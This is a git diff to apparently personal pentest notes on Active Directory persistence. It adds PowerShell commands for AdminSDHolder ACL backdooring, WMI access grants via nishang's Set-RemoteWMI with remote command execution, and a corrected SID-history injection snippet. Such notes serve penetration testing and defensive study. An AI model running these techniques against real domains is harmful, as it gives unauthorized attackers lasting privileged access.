@@ -13,6 +13,7 @@ title: Active Directory persistence
 - [9. SID History](#9-sid-history)
 - [10. Group Templates](#10-group-templates)
 - [11. GPO](#11-gpo)
+- [ACL manipulation](#acl-manipulation)
 
 ## 1. DC Sync
 The more privileged credentials are, the sonner they will be rotated after breach detection. The goal then is to persist with near-privileged credentials, not with a super-user:
@@ -22,6 +23,8 @@ The more privileged credentials are, the sonner they will be rotated after breac
 - Privileged AD services accounts
 
 It is not just the DCs that can initiate DC Synchronization. Accounts such as those belonging to the _Domain Admins_ groups can also do it for legitimate purposes such as creating a new domain controller. If our account has permission to perform DC Synchronization, we can stage a DC Sync attack to harvest credentials from a DC.
+
+> **NOTE**: To perform this attack Domain Admin privileges are not required! A user needs to have _Replication_ rights and that's enough.
 
 ```powershell
 .\mimikatz.exe
@@ -147,14 +150,27 @@ Get-ADUser <USER> -Properties name,sidhistory
 Get-ADGroup <GROUP>
 
 # Modify SID history
-Import-Moduls DSInternals
+Import-Module DSInternals
 Stop-Service ntds -Force
 Add-ADDBSidHistory -SamAccountName <USER> -SidHistory <SID> -DatabasePath 'C:\Windows\NTDS\ntds.dit'
 Start-Service ntds
 ```
 
 ## 10. Group Templates
-Group templates are objects which privileges are copied to some AD groups constantly (e.g. every hour). `SDProp` process takes the ACL of the `AdminSDHolder` object and applies it to all protected groups every 60 minutes. List of protected groups contains: `Administrators`, `Domain Admins`, `Schema Admins`, `Enterprise Admins` and more. By default, `AdminSDHolder` ACL is very restrictive. By modifing ACL of this object (injecting special ACEs), an attacker can change ACLs of all protected groups in the domain and gain full permissions to them.  
+Group templates are objects which privileges are copied to some AD groups constantly (every 60 minutes by default). `SDProp` process takes the ACL of the `AdminSDHolder` (_Admin Security Descriptor Holder_) object and applies it to all so-called Protected Groups every 60 minutes. By default, `AdminSDHolder` ACL is very restrictive. By modifing ACL of this object (injecting special ACEs), an attacker can change ACLs of all protected groups in the domain and gain full permissions to them.
+
+List of protected groups: `Account Operators`, `Backup Operators`, `Server Operators`, `Print Operators`, `Domain Admins`, `Replicator`, `Enterprise Admins`, `Domain Controllers`, `Read-only Domain Controllers`, `Schema Admins`, `Administrators`.
+
+Using this technique an attacker can grant itself an ACL to have full access to all of the protected groups without being an actual member of them.
+
+> **NOTE**: This needs to be executed as a domain administrator.
+
+```powershell
+# Add all AdminSDHolder ACLs to :user 
+Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,<...DOMAIN_DN>' -Principal <USER> -Verbose
+```
+
+Then an attacker is able to add any member to any of the protected groups.
 
 ## 11. GPO
 GPOs are excellent tool for remote management but they can be targeted to deploy persistence. Some GPO hooks are especially interesting from the attacker's point of view:
@@ -162,3 +178,16 @@ GPOs are excellent tool for remote management but they can be targeted to deploy
 - `Restricted Group Membership` - allows to give administrative access to all hosts in the domain.
 - `Logon Script Deployment` - allows to execute script (e.g. reverse shell) on every logon.
 - and more.
+
+## ACL manipulation
+It's possible to modify Security Descriptor of a remote access method object on the target machine to allow access using non-admin users. This requires admin privileges.
+
+For example, you can grant WMI access privileges to a non-admin user. The WMI access allows to execute commands ([Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1))
+
+```powershell
+# Allow the :USER WMI access on the :MACHINE
+Set-RemoteWMI -UserName <USER> -ComputerName <MACHINE> -Verbose
+
+# Execute a :COMMAND on the :MACHINE using WMI
+Invoke-Command -ScriptBlock { <COMMAND> } -ComputerName <MACHINE>
+```
